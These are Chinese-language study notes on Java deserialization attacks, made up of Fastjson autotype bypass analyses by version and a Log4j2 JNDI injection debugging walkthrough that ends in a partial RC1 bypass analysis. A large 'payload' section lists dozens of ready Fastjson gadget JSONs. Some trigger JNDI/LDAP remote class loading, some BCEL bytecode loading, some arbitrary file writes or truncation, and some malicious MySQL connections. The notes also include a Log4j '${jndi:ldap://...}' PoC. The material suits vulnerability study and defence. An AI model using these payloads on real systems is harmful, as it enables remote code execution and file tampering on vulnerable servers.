发现 `[` 的 payload 用不了了

![image-20220223164223046](img/image-20220223164223046.png)![image-20220223164223046](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223164223046.png?lastModify=1646033842)

发现，拿到第一位是 `[` ，就直接抛出异常

![image-20220223164428384](img/image-20220223164428384.png)![image-20220223164428384](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223164428384.png?lastModify=1646033842)

修复，无 poc

## 1.2.45

前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本。 使用黑名单绕过，org.apache.ibatis.datasource在1.2.46版本被加入了黑名单 由于在项目中使用的频率也较高，所以影响范围较大。

```
<dependency>
    <groupId>org.mybatis</groupId>
    <artifactId>mybatis</artifactId>
    <version>3.4.6</version>
</dependency>
```

POC

```
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exec"}}
```

## 1.2.46

黑名单封堵。

![image-20220223165901659](img/image-20220223165901659.png)![image-20220223165901659](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223165901659.png?lastModify=1646033842)

## 1.2.47 通杀

通杀 autotype 和 黑名单.

利用分为2步执行，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.JdbcRowSetImpl这个类，绕过了黑名单机制。

```
{
    "a": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "ldap://localhost:1389/Exec", 
        "autoCommit": true
    }
}
```

![image-20220223173409904](img/image-20220223173409904.png)![image-20220223173409904](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223173409904.png?lastModify=1646033842)

这里拿到的 key 是 poc 中的 `a` 不是 `@type`，所以进不去，

![image-20220224151120305](img/image-20220224151120305.png)![image-20220224151120305](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224151120305.png?lastModify=1646033842)

这里由于 poc 中 `"a":` 后边的不是 引号，而实 `{`，所以不会进入。

跟进一下这里（递归调用自己）

![image-20220224151331432](img/image-20220224151331432.png)![image-20220224151331432](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224151331432.png?lastModify=1646033842)

![image-20220224151447656](img/image-20220224151447656.png)![image-20220224151447656](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224151447656.png?lastModify=1646033842)

拿到特征字符 `@type`，

![image-20220224151610531](img/image-20220224151610531.png)![image-20220224151610531](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224151610531.png?lastModify=1646033842)

上边拿到了`@type` ，所以会进行类型检查，但 poc 中的类此时为 `java.lang.Class`，

![image-20220224152314228](img/image-20220224152314228.png)![image-20220224152314228](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224152314228.png?lastModify=1646033842)

没有进入这里的 if .

![image-20220224151902941](img/image-20220224151902941.png)![image-20220224151902941](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224151902941.png?lastModify=1646033842)

，然后 从 `mappings` 中拿类，但是没有，然后继续从`deserializers` 中找，发现了该类。

![image-20220224152101967](img/image-20220224152101967.png)![image-20220224152101967](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224152101967.png?lastModify=1646033842)

然后就 return 了。

（那么如果我们的恶意类也可以像这样返回，就可以绕过下边的限制了。）

跟进一下这里

![image-20220224152543216](img/image-20220224152543216.png)![image-20220224152543216](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224152543216.png?lastModify=1646033842)

这拿到了 `@type` 对应的 val 值

![image-20220224153438564](img/image-20220224153438564.png)![image-20220224153438564](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224153438564.png?lastModify=1646033842)

跟进 `TypeUtils.loadClass` ，注意参数为 val 值 `com.sun.rowset.JdbcRowSetImpl`

![image-20220224153720283](img/image-20220224153720283.png)![image-20220224153720283](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224153720283.png?lastModify=1646033842)

这里从 maaping 拿 classname ，现在肯定是没有的，继续往下看，

![image-20220224153838475](img/image-20220224153838475.png)![image-20220224153838475](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224153838475.png?lastModify=1646033842)

拿到 classloader 加载类，符合条件 cache = true ，应为之前调用的时候默认的。

![image-20220224153812985](img/image-20220224153812985.png)![image-20220224153812985](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224153812985.png?lastModify=1646033842)

`mappings.put(className, clazz);` 将 `com.sun.rowset.JdbcRowSetImpl` 存入 mapping 中，

然后 继续扫描 json 字符串，拿到 `b`

![image-20220224154112140](img/image-20220224154112140.png)![image-20220224154112140](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224154112140.png?lastModify=1646033842)

像之前 `a` 的那样，继续递归调用本方法

![image-20220224154234883](img/image-20220224154234883.png)![image-20220224154234883](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224154234883.png?lastModify=1646033842)

拿到 `@type` 进行类型检查,

![image-20220224154328930](img/image-20220224154328930.png)![image-20220224154328930](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224154328930.png?lastModify=1646033842)

`autoTypeSupport` 默认为 false

![image-20220224154357747](img/image-20220224154357747.png)![image-20220224154357747](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224154357747.png?lastModify=1646033842)

跟进下边的

![image-20220224154443373](img/image-20220224154443373.png)![image-20220224154443373](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224154443373.png?lastModify=1646033842)

是从 mapping 中往出取

![image-20220224154514154](img/image-20220224154514154.png)![image-20220224154514154](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224154514154.png?lastModify=1646033842)

因为上边我们分析到了，会拿到

```
"a": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
```

这里的 val 值，加载类后，放入 mapping ，所以此时拿到了 `com.sun.rowset.JdbcRowSetImpl` Class 对象。

这里因为拿到了 clazz，所以直接 return ，并不会进入 else 进行黑名单白名单检查

![image-20220224154733861](img/image-20220224154733861.png)![image-20220224154733861](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224154733861.png?lastModify=1646033842)

然后就是之后的 自动调用 setter 方法 `setAutoCommit` 触发漏洞了。

两个payload 放在一起用是因为连接断开后或者负载均衡不在一台服务器上，那么可能环境变了 mapping 中是没有 这个利用类的值得。

环境复合的情况下也可以这样

先传

```
{
    "@type": "java.lang.Class", 
    "val": "com.sun.rowset.JdbcRowSetImpl"
}
```

再传

```
{
    "@type": "com.sun.rowset.JdbcRowSetImpl", 
    "dataSourceName": "ldap://localhost:1389/Exec", 
    "autoCommit": true
}
```

## 1.2.48

修复了 1.2.47 的通杀，

指定传入的 false

![image-20220224155954990](img/image-20220224155954990.png)![image-20220224155954990](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224155954990.png?lastModify=1646033842)

导致这里 if 进不去了，也就放不进去 mapping 了。

![image-20220224160033950](img/image-20220224160033950.png)![image-20220224160033950](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224160033950.png?lastModify=1646033842)

那么最后也就不能绕过 类型检查了。

## 1.2.62

黑名单绕过

需要 `xbean-reflect` 依赖，

```
<dependencies>
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.62</version>
    </dependency>
    <dependency>
        <groupId>org.apache.xbean</groupId>
        <artifactId>xbean-reflect</artifactId>
        <version>3.4</version>
    </dependency>
</dependencies>
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://127.0.0.1:1389/Exec"}
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class ParseTest {
    public static void main(String[] args) {
        // {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://127.0.0.1:1389/Exec"}
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String json = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://127.0.0.1:1389/Exec\"}";
        System.out.println(json);
        JSON.parseObject(json);
        System.out.println("---------------");

    }
}
JndiConverter
```

![image-20220224161545041](img/image-20220224161545041.png)![image-20220224161545041](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224161545041.png?lastModify=1646033842)

`JndiConverter` 类 `toObjectImpl` 方法很明显满足 jndi 注入，但是其名字不满足 setter/getter。

看其父类 `AbstractConverter#toObject` 调用了此方法， 

![image-20220224161708865](img/image-20220224161708865.png)![image-20220224161708865](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224161708865.png?lastModify=1646033842)

再看 `setAsText` 调用了 `toObject` 方法，并且参数是可控的。

![image-20220224161819708](img/image-20220224161819708.png)![image-20220224161819708](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220224161819708.png?lastModify=1646033842)

满足 fastjson 自动调用规则。

## 1.2.66

也是基于黑名单绕过，同时需要autoTypeSupport属性为true才能使用。

```
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}

{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}

{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1389/Calc"}}
```

## payload

JdbcRowSetImpl

```
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://127.0.0.1:23457/Command8",
    "autoCommit": true
}
```

TemplatesImpl

```
{
	"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
	"_bytecodes": ["yv66vgA...k="],
	'_name': 'su18',
	'_tfactory': {},
	"_outputProperties": {},
}
```

JndiDataSourceFactory

```
{
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source": "ldap://127.0.0.1:23457/Command8"
    }
}
```

SimpleJndiBeanFactory

```
{
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "ldap://127.0.0.1:23457/Command8",
    "propertyPath": "su18",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://127.0.0.1:23457/Command8"
      ]
    }
}
```

DefaultBeanFactoryPointcutAdvisor

```
{
  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
   "beanFactory": {
     "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
     "shareableResources": [
       "ldap://127.0.0.1:23457/Command8"
     ]
   },
   "adviceBeanName": "ldap://127.0.0.1:23457/Command8"
},
{
   "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
}
```

WrapperConnectionPoolDataSource

```
{
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:aced000...6f;"
  }
```

JndiRefForwardingDataSource

```
{
    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName": "ldap://127.0.0.1:23457/Command8",
    "loginTimeout": 0
  }
```

InetAddress

```
{
	"@type": "java.net.InetAddress",
	"val": "http://dnslog.com"
}
```

Inet6Address

```
{
	"@type": "java.net.Inet6Address",
	"val": "http://dnslog.com"
}
```

URL

```
{
	"@type": "java.net.URL",
	"val": "http://dnslog.com"
}
```

JSONObject

```
{
	"@type": "com.alibaba.fastjson.JSONObject",
	{
		"@type": "java.net.URL",
		"val": "http://dnslog.com"
	}
}
""
}
```

URLReader

```
{
	"poc": {
		"@type": "java.lang.AutoCloseable",
		"@type": "com.alibaba.fastjson.JSONReader",
		"reader": {
			"@type": "jdk.nashorn.api.scripting.URLReader",
			"url": "http://127.0.0.1:9999"
		}
	}
}
```

AutoCloseable 任意文件写入

```
{
	"@type": "java.lang.AutoCloseable",
	"@type": "org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream",
	"out": {
		"@type": "java.io.FileOutputStream",
		"file": "/path/to/target"
	},
	"parameters": {
		"@type": "org.apache.commons.compress.compressors.gzip.GzipParameters",
		"filename": "filecontent"
	}
}
```

BasicDataSource

```
{
  "@type" : "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
  "driverClassName" : "$$BCEL$$$l$8b$I$A$A$A$A...",
  "driverClassLoader" :
  {
    "@type":"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;"
  }
}
```

JndiConverter

```
{
	"@type": "org.apache.xbean.propertyeditor.JndiConverter",
	"AsText": "ldap://127.0.0.1:23457/Command8"
}
```

JtaTransactionConfig

```
{
	"@type": "com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
	"properties": {
		"@type": "java.util.Properties",
		"UserTransaction": "ldap://127.0.0.1:23457/Command8"
	}
}
```

JndiObjectFactory

```
{
	"@type": "org.apache.shiro.jndi.JndiObjectFactory",
	"resourceName": "ldap://127.0.0.1:23457/Command8"
}
```

AnterosDBCPConfig

```
{
	"@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
	"metricRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

AnterosDBCPConfig2

```
{
	"@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
	"healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

CacheJndiTmLookup

```
{
	"@type": "org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
	"jndiNames": "ldap://127.0.0.1:23457/Command8"
}
```

AutoCloseable 清空指定文件

```
{
    "@type":"java.lang.AutoCloseable",
    "@type":"java.io.FileOutputStream",
    "file":"/tmp/nonexist",
    "append":false
}
```

AutoCloseable 清空指定文件

```
{
    "@type":"java.lang.AutoCloseable",
    "@type":"java.io.FileWriter",
    "file":"/tmp/nonexist",
    "append":false
}
```

AutoCloseable 任意文件写入

```
{
    "stream":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"java.io.FileOutputStream",
        "file":"/tmp/nonexist",
        "append":false
    },
    "writer":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"org.apache.solr.common.util.FastOutputStream",
        "tempBuffer":"SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=",
        "sink":
        {
            "$ref":"$.stream"
        },
        "start":38
    },
    "close":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"org.iq80.snappy.SnappyOutputStream",
        "out":
        {
            "$ref":"$.writer"
        }
    }
}
```

AutoCloseable MarshalOutputStream 任意文件写入

```
{
	'@type': "java.lang.AutoCloseable",
	'@type': 'sun.rmi.server.MarshalOutputStream',
	'out': {
		'@type': 'java.util.zip.InflaterOutputStream',
		'out': {
			'@type': 'java.io.FileOutputStream',
			'file': 'dst',
			'append': false
		},
		'infl': {
			'input': {
				'array': 'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',
				'limit': 22
			}
		},
		'bufLen': 1048576
	},
	'protocolVersion': 1
}
```

BasicDataSource

```
{
		"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
		"driverClassName": "true",
		"driverClassLoader": {
			"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
		},
		"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A"
	}
```

HikariConfig

```
{
	"@type": "com.zaxxer.hikari.HikariConfig",
	"metricRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

HikariConfig

```
{
	"@type": "com.zaxxer.hikari.HikariConfig",
	"healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

HikariConfig

```
{
	"@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
	"metricRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

HikariConfig

```
{
	"@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
	"healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

SessionBeanProvider

```
{
	"@type": "org.apache.commons.proxy.provider.remoting.SessionBeanProvider",
	"jndiName": "ldap://127.0.0.1:23457/Command8",
	"Object": "su18"
}
```

JMSContentInterceptor

```
{
	"@type": "org.apache.cocoon.components.slide.impl.JMSContentInterceptor",
	"parameters": {
		"@type": "java.util.Hashtable",
		"java.naming.factory.initial": "com.sun.jndi.rmi.registry.RegistryContextFactory",
		"topic-factory": "ldap://127.0.0.1:23457/Command8"
	},
	"namespace": ""
}
```

ContextClassLoaderSwitcher

```
{
	"@type": "org.jboss.util.loading.ContextClassLoaderSwitcher",
	"contextClassLoader": {
		"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
	},
	"a": {
		"@type": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A"
	}
}
```

OracleManagedConnectionFactory

```
{
	"@type": "oracle.jdbc.connector.OracleManagedConnectionFactory",
	"xaDataSourceName": "ldap://127.0.0.1:23457/Command8"
}
```

JNDIConfiguration

```
{
	"@type": "org.apache.commons.configuration.JNDIConfiguration",
	"prefix": "ldap://127.0.0.1:23457/Command8"
}
```

JDBC4Connection

```
{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.jdbc.JDBC4Connection",
	"hostToConnectTo": "172.20.64.40",
	"portToConnectTo": 3306,
	"url": "jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
	"databaseToConnectTo": "test",
	"info": {
		"@type": "java.util.Properties",
		"PORT": "3306",
		"statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
		"autoDeserialize": "true",
		"user": "yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn",
		"PORT.1": "3306",
		"HOST.1": "172.20.64.40",
		"NUM_HOSTS": "1",
		"HOST": "172.20.64.40",
		"DBNAME": "test"
	}
}
```

LoadBalancedMySQLConnection

```
{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
	"proxy": {
		"connectionString": {
			"url": "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"
		}
	}
}
```

ReplicationMySQLConnection

```
{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
	"proxy": {
		"@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
		"connectionUrl": {
			"@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
			"masters": [{
				"host": "mysql.host"
			}],
			"slaves": [],
			"properties": {
				"host": "mysql.host",
				"user": "user",
				"dbname": "dbname",
				"password": "pass",
				"queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
				"autoDeserialize": "true"
			}
		}
	}
}
```

UnpooledDataSource

```
{
	"x": {
		{
			"@type": "com.alibaba.fastjson.JSONObject",
			"name": {
				"@type": "java.lang.Class",
				"val": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource"
			},
			"c": {
				"@type": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
				"key": {
					"@type": "java.lang.Class",
					"val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
				},
				"driverClassLoader": {
					"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
				},
				"driver": "$$BCEL$$$l$8b$..."
			}
		}: "a"
	}
}
```

https://xz.aliyun.com/t/7027

https://mp.weixin.qq.com/s/i7-g89BJHIYTwaJbLuGZcQ

https://y4er.com/post/fastjson-learn/

## fastjson 深入

https://github.com/safe6Sec/Fastjson

# log4j2

## jndi

影响版本 `log4j <= 2.14.1`

pom.xml

```
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
```

poc:

```
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Demo {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger();
        String payload = "${jndi:ldap://127.0.0.1:1389/poc}";
        logger.error(payload);
    }
}
```

调试：

一直层层步进，

```
encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)
processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)
log:481, LoggerConfig (org.apache.logging.log4j.core.config)
log:456, LoggerConfig (org.apache.logging.log4j.core.config)
log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)
log:161, Logger (org.apache.logging.log4j.core)
tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)
logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)
logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)
logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)
logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)
error:740, AbstractLogger (org.apache.logging.log4j.spi)
main:8, Demo
```

来到 `PatternLayout#encode`

![image-20220225124722024](img/image-20220225124722024.png)![image-20220225124722024](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225124722024.png?lastModify=1646033842)

触发点是 `toText` 方法，

![image-20220225124808029](img/image-20220225124808029.png)![image-20220225124808029](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225124808029.png?lastModify=1646033842)

跟进`toSerializable`

![image-20220225124924405](img/image-20220225124924405.png)![image-20220225124924405](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225124924405.png?lastModify=1646033842)

这里 `formatters` 包含多个 `formatter` 对象，其中触发漏洞的是第8个，其中包含`MessagePatternConverter`

![image-20220225125109805](img/image-20220225125109805.png)![image-20220225125109805](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225125109805.png?lastModify=1646033842)

![image-20220225125225033](img/image-20220225125225033.png)![image-20220225125225033](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225125225033.png?lastModify=1646033842)

调用了， `converter.format` 方法，跟进

![image-20220225125627971](img/image-20220225125627971.png)![image-20220225125627971](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225125627971.png?lastModify=1646033842)

这里判断拿到 `$` 和 `{` ，然后截取拿到 value ，也就是 poc `${jndi:ldap://127.0.0.1:1389/poc}`。

跟进这里的 `replace` 方法

![image-20220225125903885](img/image-20220225125903885.png)![image-20220225125903885](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225125903885.png?lastModify=1646033842)

继续跟进 `StrSubstitutor.subtute`，

之间主要作用是递归处理日志输入，转为对应的输出

直到来到

![image-20220225130029006](img/image-20220225130029006.png)![image-20220225130029006](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225130029006.png?lastModify=1646033842)

跟进，

![image-20220225130137002](img/image-20220225130137002.png)![image-20220225130137002](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225130137002.png?lastModify=1646033842)

关键进入 `resolver.lookup(event, variableName);`

![image-20220225130424306](img/image-20220225130424306.png)![image-20220225130424306](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225130424306.png?lastModify=1646033842)

首先拿到第一个 `:` 的位置，然后截取，这里是 `jndi`，然后截取 `:` 后边的 `ldap://127.0.0.1:1389/poc`，

然后从 `strLookupMap` 找 key 为 `jndi` 对应的值 lookup 对象，这里是`JndiLookup`。

![image-20220225130822582](img/image-20220225130822582.png)![image-20220225130822582](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225130822582.png?lastModify=1646033842)

拿到了`lookup` 不为 null， `event` 也不为 null，所以进入 `lookup.lookup(event, name)` ，此时 name 为 `ldap://127.0.0.1:1389/poc`

![image-20220225131001485](img/image-20220225131001485.png)![image-20220225131001485](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225131001485.png?lastModify=1646033842)

触发点 `jndiManager.lookup(jndiName)`

![image-20220225131056578](img/image-20220225131056578.png)![image-20220225131056578](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225131056578.png?lastModify=1646033842)

符合 jndi 漏洞触发的格式。

最终调用栈

```
lookup:172, JndiManager (org.apache.logging.log4j.core.net)
lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)
processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)
log:481, LoggerConfig (org.apache.logging.log4j.core.config)
log:456, LoggerConfig (org.apache.logging.log4j.core.config)
log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)
log:161, Logger (org.apache.logging.log4j.core)
tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)
logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)
logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)
logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)
logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)
error:740, AbstractLogger (org.apache.logging.log4j.spi)
main:8, Demo
```

## RC1 绕过分析

修复版本`2.15.0-rc1`

https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1

尝试之前的 poc,

调试一直跟进到`PatternLayout.toSerializable`方法发生了变化

![image-20220225144341550](img/image-20220225144341550.png)![image-20220225144341550](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225144341550.png?lastModify=1646033842)

这里由之前的  `MessagePatternConverter` 变成了 `MessagePatternConverter.SimplePatternConverter` 类，

![image-20220225144652342](img/image-20220225144652342.png)![image-20220225144652342](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225144652342.png?lastModify=1646033842)

跟进到 `MessagePatternConverter.SimplePatternConverter` 类 的 format 方法，

![image-20220225144909586](img/image-20220225144909586.png)![image-20220225144909586](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225144909586.png?lastModify=1646033842)

这里会将 paylaod 和日志格式字符串直接拼接，也就算修复了之前的匹配 `$` 和 `{` 之后的漏洞触发点。

**但这里还有它的其他子类，注意 `LookupMessagePatternConverter` 重写的 format 就会判断 `${` 和之前的漏洞触发一样，那么如果 `Converter`被设置为该类，那么会继续进行`${}`的处理。** 

![image-20220225145305181](img/image-20220225145305181.png)![image-20220225145305181](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225145305181.png?lastModify=1646033842)

具体需要设置为哪一个子类取决于用户的配置

![image-20220225145853298](img/image-20220225145853298.png)![image-20220225145853298](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225145853298.png?lastModify=1646033842)

想要开启，得需要 `loadLookups(options)` 方法返回 true .

![image-20220225145948097](img/image-20220225145948097.png)![image-20220225145948097](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225145948097.png?lastModify=1646033842)

很明显，只要传入 `lookups` 即可开启。

于是想办法开启`lookup`功能分析后续有没有限制

```
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.Configuration;
